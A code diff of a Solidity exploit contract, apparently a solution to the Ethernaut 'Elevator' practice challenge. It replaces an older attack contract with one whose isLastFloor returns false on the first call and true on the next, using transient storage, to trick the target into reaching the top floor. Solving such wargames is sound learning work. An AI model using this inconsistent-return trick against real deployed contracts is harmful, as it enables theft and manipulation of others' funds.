@@ -2,39 +2,26 @@
 pragma solidity ^0.8.0;
 
 interface IElevator {
-  function goTo(uint _floor) external;
+    function goTo(uint256 _floor) external;
 }
 
-interface Building {
-  function isLastFloor(uint) external returns (bool);
-}
-
-contract Elevator {
-  bool public top;
-  uint public floor;
-
-  function goTo(uint _floor) public {
-    Building building = Building(msg.sender);
-
-    if (!building.isLastFloor(_floor)) {
-      floor = _floor;
-      top = building.isLastFloor(floor);
-    }
-  }
-}
-
-contract Attack{
-    address _addr = 0xAF8149b60EAa9807cC10d33f426eAcd3a24DDAF7;
-    bool called = false;
-
-    function doStuff() public {
-        IElevator(_addr).goTo(2);
+contract Attack {
+    function goTo(IElevator elevator) external {
+        // any number will do
+        elevator.goTo(block.number);
     }
 
-    function isLastFloor(uint _floor) public returns (bool){
-        if (!called){
-            called = true;
-            return false;
-        } else return true;
+    function isLastFloor(uint256) external returns (bool) {
+        // use transient storage
+        assembly {
+            let isCalled := tload(0)
+            if iszero(isCalled) { 
+                tstore(0, 1)
+                return(0, 32)
+            }
+
+            mstore(0, 1)
+            return(0, 32)
+        }
     }
 }
